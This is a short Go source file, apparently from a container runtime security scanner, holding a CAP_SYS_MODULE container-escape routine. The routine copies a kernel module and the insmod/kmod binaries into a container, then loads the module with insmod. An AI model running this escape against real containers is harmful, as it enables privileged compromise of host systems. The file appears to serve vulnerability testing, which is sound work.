package exp

import (
	"Container_runtime_scanner/internal/docker"
	"fmt"
	"log"
)

func Exploit_cap_sys_module(logger *log.Logger, cont *docker.Container) {
	logger.Println("CAP_SYS_MODULE 权限逃逸")

	err := cont.CopyFileToContainerBase64("exp.ko", "/tmp/exp.ko")
	if err != nil {
		fmt.Println(err)
	}
	err = cont.SSHCopyFileToContainerBase64("/sbin/insmod", "/sbin/insmod")
	if err != nil {
		fmt.Println(err)
	}
	err = cont.SSHCopyFileToContainerBase64("/bin/kmod", "/bin/kmod")
	if err != nil {
		fmt.Println(err)
	}
	cont.ShExecStep("insmod /tmp/exp.ko")
	cont.ShExecStep("rmmod /tmp/exp.ko")
	//if data.RegexGetBool("Container_runtime_scanner_123456", response) {
	//	logger.Println("验证漏洞成功，并成功逃逸")
	//	fmt.Println("验证漏洞成功，并成功逃逸")
	//} else {
	//	logger.Println("逃逸失败")
	//	fmt.Println("验证漏洞成功，并成功逃逸")
	//}
	//
	//logger.Println("删除测试记录")
	//cont.ShExecStep("umount -f /test1")
	//cont.ShExecStep("rm -r /test1")
	//logger.Println("----------------------")

}
